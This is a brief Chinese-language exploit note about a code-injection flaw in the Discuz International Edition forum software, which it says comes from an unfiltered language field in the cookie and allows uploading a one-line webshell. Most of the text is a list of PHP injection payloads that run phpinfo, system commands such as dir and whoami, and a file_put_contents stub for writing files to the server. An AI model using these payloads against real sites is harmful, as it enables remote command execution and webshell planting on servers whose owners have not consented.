漏洞发生的版本为 Discuz 国际版。用户数量不多，所以影响不大

cookie 中 language字段未添加 过滤所致，可以上传一句话木马

payload

```'.phpinfo().'```

```'.system(dir).'```

```'.whoami.'```

```'.system(whoami).'```

```'.file_put_contents(,).'```
